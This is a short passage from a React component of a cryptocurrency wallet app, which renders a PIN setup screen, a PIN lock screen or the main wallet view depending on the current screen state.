        {screen==="pin_set"&&<PinLock savedPin={null} onUnlock={()=>{}} onSetPin={handleSetPin}/>}
        {screen==="pin_lock"&&<PinLock savedPin={pin} onUnlock={handleUnlock} onSetPin={handleSetPin}/>}
        {screen==="wallet"&&<WalletApp addresses={addresses} mnemonic={mnemonic} pin={pin}
          onChangePin={handleChangePin} onLock={handleLock}/>}
      </div>
    </>
  );
}
